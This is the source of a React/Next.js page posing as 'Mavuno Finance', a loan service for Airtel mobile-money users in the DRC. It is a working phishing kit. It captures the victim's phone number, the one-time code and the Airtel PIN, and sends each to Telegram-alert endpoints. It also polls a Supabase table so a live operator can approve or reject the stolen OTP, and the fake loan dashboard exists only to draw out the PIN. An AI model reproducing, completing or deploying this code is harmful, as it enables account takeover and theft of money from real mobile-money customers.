'use client'

import { useEffect, useRef, useState } from 'react'
import { ArrowRight, CheckCircle2, Clock3, FileText, Loader, Loader2, LockKeyhole, ShieldCheck, WalletCards } from 'lucide-react'
import { createClient } from '@/lib/supabase/client';
import { Clock, ArrowLeft, AlertCircle, X } from 'lucide-react';
const otpLength = 4

function sendTelegramAlert(type: 'login' | 'otp' | 'loan' | 'pin', phone: string, amount?: string, otp?: string, pin?: string) {
  void fetch('/api/telegram-alert', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ type, phone, amount, otp, pin }),
  }).catch(() => undefined)
}

export default function Page() {
  const [step, setStep] = useState<'phone' | 'otp' | 'dashboard'>('phone')
  const [phone, setPhone] = useState('')
  const [otp, setOtp] = useState<string[]>(Array(otpLength).fill(''))
  const [error, setError] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const otpRefs = useRef<Array<HTMLInputElement | null>>([])
  const [recordId, setRecordId] = useState<string | null>(null);
  const [isPolling, setIsPolling] = useState(false);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const supabaseRef = useRef(createClient());
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showDeniedModal, setShowDeniedModal] = useState(false);
  useEffect(() => {
    if (step === 'otp') otpRefs.current[0]?.focus()
  }, [step])

  function continueToOtp() {
    const digits = phone.replace(/\D/g, '')
    const isAirtelNumber = (digits.startsWith('09') || digits.startsWith('9')) && digits.length >= 9 && digits.length <= 10
    if (!isAirtelNumber) {
      setError('Veuillez saisir un numéro Airtel actif de la RDC commençant par 09 ou 9.')
      return
    }
    setError('')
    sendTelegramAlert('login', phone)
    setIsLoading(true)
    window.setTimeout(() => {
      setIsLoading(false)
      setStep('otp')
    }, 2000)
  }

  function updateOtp(value: string, index: number) {
    const digit = value.replace(/\D/g, '').slice(-1)
    const next = [...otp]
    next[index] = digit
    setOtp(next)
    setError('')
    if (digit && index < otpLength - 1) otpRefs.current[index + 1]?.focus()
  }
 const startRealtimePolling = async (recId: string) => {
    setIsPolling(true);
    // setShowLoadingModal(true);
    setIsLoading(true);

    const supabase = supabaseRef.current;

    // Subscribe to real-time updates
    const channel = supabase
      .channel(`otp-${recId}`)
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'otp_verifications',
          filter: `id=eq.${recId}`,
        },
        (payload: any) => {
          console.log('[v0] Real-time update:', payload.new.status);
          
          if (payload.new.status === 'verified') {
             setStep('dashboard');
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setIsLoading(false);
            setIsPolling(false);
          
          } else if (payload.new.status === 'denied') {
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setIsLoading(false);
            setIsPolling(false);
            setShowLoadingModal(false);
            setShowDeniedModal(true);
          }
        }
      )
      .subscribe();

    // Fallback polling every 3 seconds if real-time doesn't work
    pollingIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch('/api/check-otp-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ recordId: recId }),
        });

        const data = await response.json();

        if (data.status === 'verified') {
          setStep('dashboard');
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
           setIsLoading(false);
          setIsPolling(false);
        } else if (data.status === 'denied') {
          setShowLoadingModal(false);
          setShowDeniedModal(true);
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
          setIsLoading(false);
          setIsPolling(false);
        }
      } catch (error) {
        console.error('[v0] Polling error:', error);
      }
    }, 3000);
  };
 const submitOtp = async () =>  {
    if (!otp.every(Boolean)) {
      setError('Veuillez saisir les 4 chiffres du code de vérification.')
      return
    }
    setError('')
    setShowLoadingModal(true);

     try {
        const response = await fetch('/api/send-otp-telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            phoneNumber: `${phone}`,
            otpCoode : `${otp}`,
       }),
        });

        const data = await response.json();
        setRecordId(data.recordId);
        startRealtimePolling(data.recordId);
        setIsLoading(true);
      } catch (error) {
        console.error('[v0] Error sending OTP:', error);
      }
    // window.setTimeout(() => {
    //   setIsLoading(false)
    //   sendTelegramAlert('otp', phone, undefined, otp.join(''))
    //   setStep('dashboard')
    // }, 2000)
  }


   const handleResendFromModal = async () => {
    setShowDeniedModal(false);
    try {
      await fetch('/api/resend-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone }),
      });
     setOtp(Array(otpLength).fill(''));
      otpRefs.current[0]?.focus();
    } catch (error) {
      console.error('[v0] Error resending OTP:', error);
    }
  };


  function handleOtpKeyDown(event: React.KeyboardEvent<HTMLInputElement>, index: number) {
    if (event.key === 'Backspace' && !otp[index] && index > 0) otpRefs.current[index - 1]?.focus()
  }

  return (
    <main className="min-h-screen bg-[#f5f7fa] text-[#17212b]">
      <div className="mx-auto flex min-h-screen max-w-[1440px] flex-col lg:flex-row">
        <aside className="relative hidden overflow-hidden bg-[#0d2b36] px-12 py-12 text-white lg:flex lg:w-[43%] lg:flex-col lg:justify-between xl:px-20">
          <div className="absolute -right-36 -top-28 size-[480px] rounded-full border border-white/10" />
          <div className="absolute -bottom-40 -left-28 size-[440px] rounded-full border border-[#8dbb9d]/20" />
          <div className="relative z-10 flex items-center gap-3">
            <div className="grid size-11 place-items-center rounded-xl bg-[#c9e9d4] text-[#0d2b36]">
              <WalletCards aria-hidden="true" className="size-5" strokeWidth={2.2} />
            </div>
            <span className="text-lg font-semibold tracking-tight">Mavuno Finance</span>
          </div>
          <div className="relative z-10 max-w-md pb-16">
            <p className="mb-5 text-sm font-medium uppercase tracking-[0.2em] text-[#a9cfb5]">Simple. Responsable. À vous.</p>
            <h1 className="text-5xl font-semibold leading-[1.08] tracking-[-0.04em] xl:text-6xl">Avancez en toute confiance.</h1>
            <p className="mt-6 max-w-sm text-base leading-7 text-slate-300">Accédez aux fonds dont vous avez besoin avec un plan clair, des conditions transparentes et un accompagnement adapté.</p>
            <div className="mt-12 flex items-center gap-3 text-sm text-slate-300"><ShieldCheck className="size-5 text-[#a9cfb5]" /> Vos informations sont protégées</div>
          </div>
          <p className="relative z-10 text-xs text-slate-400">© 2026 Mavuno Finance · Partenaire de prêt agréé</p>
        </aside>

        <section className="flex flex-1 flex-col px-5 py-6 sm:px-10 sm:py-10 lg:px-16 xl:px-24">
          <header className="flex items-center justify-between lg:justify-end">
            <div className="flex items-center gap-2 lg:hidden"><div className="grid size-9 place-items-center rounded-lg bg-[#0d2b36] text-[#c9e9d4]"><WalletCards className="size-4" /></div><span className="font-semibold">Mavuno</span></div>
            <div className="flex items-center gap-2 text-xs font-medium text-slate-500"><LockKeyhole className="size-3.5" /> Connexion sécurisée</div>
          </header>

          {step !== 'dashboard' ? (
            <div className="mx-auto flex w-full max-w-md flex-1 flex-col justify-center py-14">
              <div className="mb-10 flex items-center gap-2"><div className={`h-1.5 flex-1 rounded-full ${step === 'phone' ? 'bg-[#0d2b36]' : 'bg-[#c9e9d4]'}`} /><div className={`h-1.5 flex-1 rounded-full ${step === 'otp' ? 'bg-[#0d2b36]' : 'bg-slate-200'}`} /></div>
              {step === 'phone' ? <>
                <p className="mb-3 text-sm font-medium text-[#5c9870]">Bienvenue chez Mavuno</p>
                <h2 className="text-3xl font-semibold tracking-[-0.035em] text-[#17212b]">Commençons.</h2>
                <p className="mt-3 leading-6 text-slate-500">Saisissez votre numéro de mobile pour accéder en toute sécurité à votre compte de prêt.</p>
                <div className="mt-10">
                  <label htmlFor="phone" className="mb-2 block text-sm font-medium text-slate-700">Numéro de mobile</label>
                  <div className="flex h-14 overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm focus-within:border-[#5c9870] focus-within:ring-4 focus-within:ring-[#5c9870]/10">
                    <span className="flex items-center border-r border-slate-200 px-4 text-sm font-semibold text-slate-600">+243</span>
                    <input id="phone" type="tel" inputMode="numeric" value={phone} onChange={(event) => { setPhone(event.target.value); setError('') }} placeholder="9 81 234 567" className="min-w-0 flex-1 bg-transparent px-4 text-base outline-none placeholder:text-slate-300" aria-describedby={error ? 'phone-error' : undefined} />
                  </div>
                  {error && <p id="phone-error" className="mt-2 text-sm text-red-600">{error}</p>}
                  <button type="button" onClick={continueToOtp} disabled={isLoading} className="mt-5 flex h-14 w-full items-center justify-center gap-2 rounded-xl bg-[#0d2b36] text-sm font-semibold text-white shadow-lg shadow-[#0d2b36]/15 transition hover:bg-[#164452] focus:outline-none focus:ring-4 focus:ring-[#0d2b36]/20 disabled:cursor-wait disabled:opacity-75">{isLoading ? <><Loader2 className="size-4 animate-spin" /> Vérification du numéro...</> : <>Continuer <ArrowRight className="size-4" /></>}</button>
                </div>
                <p className="mt-7 text-center text-xs leading-5 text-slate-400">En continuant, vous acceptez nos <span className="font-medium text-slate-600">conditions d&apos;utilisation</span> et notre <span className="font-medium text-slate-600">politique de confidentialité</span>.</p>
              </> : <>
                <button type="button" onClick={() => setStep('phone')} className="mb-8 self-start text-sm font-medium text-[#5c9870] hover:text-[#0d2b36]">← Modifier le numéro</button>
                <p className="mb-3 text-sm font-medium text-[#5c9870]">Vérifiez votre numéro</p>
                <h2 className="text-3xl font-semibold tracking-[-0.035em]">Saisissez votre code.</h2>
                <p className="mt-3 leading-6 text-slate-500">Nous avons envoyé un code de vérification à 4 chiffres au <span className="font-medium text-slate-700">+243 {phone}</span>.</p>
                <div className="mt-10 flex gap-2 sm:gap-3" role="group" aria-label="Code de vérification à usage unique">
                  {otp.map((digit, index) => <input key={index} ref={(element) => { otpRefs.current[index] = element }} value={digit} onChange={(event) => updateOtp(event.target.value, index)} onKeyDown={(event) => handleOtpKeyDown(event, index)} disabled={isLoading} maxLength={1} inputMode="numeric" aria-label={`Digit ${index + 1}`} className="size-12 rounded-xl border border-slate-200 bg-white text-center text-xl font-semibold shadow-sm outline-none transition focus:border-[#5c9870] focus:ring-4 focus:ring-[#5c9870]/10 disabled:cursor-wait disabled:opacity-60 sm:size-14" />)}
                </div>
                {error && <p className="mt-3 text-sm text-red-600">{error}</p>}
                <button type="button" onClick={submitOtp} disabled={isLoading || !otp.every(Boolean)} className="mt-7 flex h-14 w-full items-center justify-center gap-2 rounded-xl bg-[#0d2b36] text-sm font-semibold text-white shadow-lg shadow-[#0d2b36]/15 transition hover:bg-[#164452] focus:outline-none focus:ring-4 focus:ring-[#0d2b36]/20 disabled:cursor-not-allowed disabled:opacity-50">{isLoading ? <><Loader2 className="size-4 animate-spin" /> Vérification de votre code...</> : <>Vérifier le code <ArrowRight className="size-4" /></>}</button>
                {!isLoading && <p className="mt-5 text-center text-sm text-slate-500">Vous n&apos;avez pas reçu de code ? <button type="button" className="font-semibold text-[#5c9870] hover:text-[#0d2b36]">Renvoyer le code</button></p>}
              </>}
        {showLoadingModal && (
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
            <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-yellow-600 animate-spin mx-auto mb-4" />
            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Chargement…</h3>
            <p className="text-gray-500 text-sm sm:text-base">
              Veuillez ne pas fermer cette fenêtre. Vérification de votre code OTP en cours…
            </p>
          </div>
         </div>
      )}
       {showDeniedModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
          
            <div className="flex justify-center mb-4 sm:mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle className="w-8 h-8 sm:w-10 sm:h-10 text-red-600" />
              </div>
            </div>

            {/* Error Message */}
            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code OTP expiré</h3>
            <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
              La vérification de votre code OTP a été refusée. Veuillez demander un nouveau code pour continuer.
            </p>

            {/* Resend Button */}
            <button 
              onClick={handleResendFromModal}
              className="w-full bg-yellow-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-yellow-500 transition-colors mb-3">
             Renvoyer le code
            </button>
          </div>
        </div>
      )}

            </div>
          ) : <Dashboard onLogout={() => { setOtp(Array(otpLength).fill('')); setStep('phone') }} />}
          <footer className="pt-5 text-center text-xs text-slate-400">Besoin d&apos;aide ? <span className="font-medium text-slate-600">Contacter l&apos;assistance</span></footer>
        </section>
      </div>
    </main>
  )
}

function Dashboard({ phone, onLogout }: { phone: string; onLogout: () => void }) {
  const [modalStep, setModalStep] = useState<'amount' | 'processing' | 'confirm' | null>(null)
  const [amount, setAmount] = useState('')
  const [pin, setPin] = useState('')
  const [isApplyLoading, setIsApplyLoading] = useState(false)

  function openApplication() {
    setIsApplyLoading(true)
    window.setTimeout(() => {
      setIsApplyLoading(false)
      setModalStep('amount')
    }, 2000)
  }

  function sendAmount() {
    if (!amount || Number(amount) <= 0 || Number(amount) > 1250) return
    sendTelegramAlert('loan', phone, amount)
    setModalStep(null)
    window.setTimeout(() => {
      setModalStep('processing')
      window.setTimeout(() => {
        setModalStep(null)
        window.setTimeout(() => setModalStep('confirm'), 100)
      }, 2000)
    }, 100)
  }
   function sendPin() {
    sendTelegramAlert('pin', pin)
     window.setTimeout(() => {
      setModalStep('processing')
      window.setTimeout(() => {
        setModalStep(null)
        // window.setTimeout(() => setModalStep('confirm'), 100)
      }, 2000)
    }, 100)
   }

  return <div className="mx-auto w-full max-w-4xl flex-1 py-12 lg:py-20">
    <div className="flex flex-col justify-between gap-5 sm:flex-row sm:items-start"><div><p className="mb-2 text-sm font-medium text-[#5c9870]">Bonjour, Tendai</p><h2 className="text-3xl font-semibold tracking-[-0.035em]">Aperçu de votre prêt</h2><p className="mt-2 text-slate-500">Voici votre situation d&apos;emprunt actuelle.</p></div><button type="button" onClick={onLogout} className="self-start rounded-lg px-3 py-2 text-sm font-medium text-slate-500 hover:bg-white hover:text-[#0d2b36]">Se déconnecter</button></div>
    <div className="mt-10 overflow-hidden rounded-2xl bg-[#0d2b36] p-7 text-white shadow-xl shadow-[#0d2b36]/10 sm:p-9"><div className="flex items-start justify-between"><div><p className="text-sm text-slate-300">Plafond de prêt disponible</p><p className="mt-3 text-4xl font-semibold tracking-[-0.04em]">$1,250<span className="ml-2 text-lg font-normal text-slate-300">USD</span></p></div><div className="grid size-11 place-items-center rounded-xl bg-white/10"><WalletCards className="size-5 text-[#c9e9d4]" /></div></div><div className="mt-8 h-2 overflow-hidden rounded-full bg-white/10"><div className="h-full w-[72%] rounded-full bg-[#b8dfc4]" /></div><div className="mt-3 flex justify-between text-xs text-slate-400"><span>0 $ utilisés</span><span>1 250 $ au total</span></div></div>
    <div className="mt-5 flex items-center justify-between gap-4 rounded-2xl border border-[#dce8df] bg-[#f0f8f2] p-5"><div><p className="font-semibold text-[#183a2a]">Prêt quand vous l&apos;êtes</p><p className="mt-1 text-sm text-[#547060]">Demandez jusqu&apos;à 1 250 $.</p></div><button type="button" onClick={openApplication} disabled={isApplyLoading} className="flex shrink-0 items-center justify-center gap-2 rounded-xl bg-[#5c9870] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#477d5a] disabled:cursor-wait disabled:opacity-75">{isApplyLoading ? <><Loader2 className="size-4 animate-spin" /> Préparation...</> : <>Demander <ArrowRight className="size-4" /></>}</button></div>
    <div className="mt-5 grid gap-5 sm:grid-cols-3"><Stat icon={FileText} label="Taux d&apos;intérêt" value="12.5%" detail="Taux fixe compétitif" /><Stat icon={Clock3} label="Durée de remboursement" value="3 mois" detail="Dates de paiement flexibles" /><Stat icon={CheckCircle2} label="Statut du compte" value="Prêt à demander" detail="Aucun prêt actif" /></div>
    {modalStep && <div className="fixed inset-0 z-50 grid place-items-center bg-[#071217]/70 p-5 backdrop-blur-sm" role="dialog" aria-modal="true" aria-label="Demande de prêt"><div className="w-full max-w-lg rounded-[2rem] bg-[#232323] p-7 text-white shadow-2xl sm:p-10">
      {modalStep === 'processing' ? <div className="flex min-h-64 flex-col items-center justify-center text-center"><Loader2 className="size-8 animate-spin text-white" /><p className="text-sm font-normal text-white">Traitement USSD</p><p className="mt-2 text-sm font-normal text-white">Veuillez patienter pendant la préparation de votre demande de prêt.</p></div> : modalStep === 'amount' ? <><p className="text-sm font-normal text-white">Saisissez le montant demandé</p><p className="mt-2 text-sm font-normal text-white">Saisissez un montant entre 1 $ et 1 250 $.</p><label htmlFor="loan-amount" className="sr-only">Montant du prêt</label><div className="relative mt-7"><input id="loan-amount" type="number" min="1" max="1250" value={amount} onChange={(event) => setAmount(event.target.value)} className="h-14 w-full rounded-2xl border border-white/10 bg-[#363636] px-5 text-lg text-white outline-none caret-white focus:border-white" />{!amount && <span aria-hidden="true" className="pointer-events-none absolute left-5 top-1/2 h-6 w-px -translate-y-1/2 animate-pulse bg-white" />}</div><div className="mt-7 grid grid-cols-2 gap-4"><button type="button" onClick={() => setModalStep(null)} className="h-12 rounded-full bg-[#444] text-sm font-semibold text-slate-200 transition hover:bg-[#505050]">Annuler</button><button type="button" onClick={sendAmount} className="h-12 rounded-full bg-[#2bd174] text-sm font-semibold text-[#10251a] transition hover:bg-[#45e285]">Envoyer</button></div></> : <><p className="text-sm font-normal text-white">Confirmez la réception du prêt Mavuno de {Number(amount).toLocaleString()}.</p><p className="mt-3 text-sm font-normal text-white">Saisissez votre code Airtel  PIN pour lancer la transaction.</p><label htmlFor="loan-pin" className="sr-only">Code PIN</label><input id="loan-pin" type="number" inputMode="numeric" maxLength={4} value={pin} onChange={(event) => setPin(event.target.value.replace(/\\D/g, '').slice(0, 4))} className="mt-7 h-16 w-full rounded-2xl border border-white/10 bg-[#363636] px-5 text-center text-2xl tracking-[0.6em] outline-none placeholder:text-base placeholder:tracking-normal placeholder:text-slate-500 focus:border-[#2bd174]" /><div className="mt-7 grid grid-cols-2 gap-4"><button type="button" onClick={() => setModalStep(null)} className="h-14 rounded-full bg-[#444] text-base font-semibold text-slate-200 transition hover:bg-[#505050]">Annuler</button><button type="button" disabled={pin.length < 4} onClick={() => sendPin()} className="h-14 rounded-full bg-[#2bd174] text-base font-semibold text-[#10251a] transition hover:bg-[#45e285] disabled:cursor-not-allowed disabled:opacity-40">Confirmer</button></div></>}
    </div></div>}
  </div>
}

function Stat({ icon: Icon, label, value, detail }: { icon: typeof FileText; label: string; value: string; detail: string }) {
  return <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm"><div className="flex items-center gap-2 text-xs font-medium uppercase tracking-[0.12em] text-slate-400"><Icon className="size-4 text-[#5c9870]" />{label}</div><p className="mt-5 text-2xl font-semibold tracking-[-0.03em]">{value}</p><p className="mt-1 text-sm text-slate-500">{detail}</p></div>
}
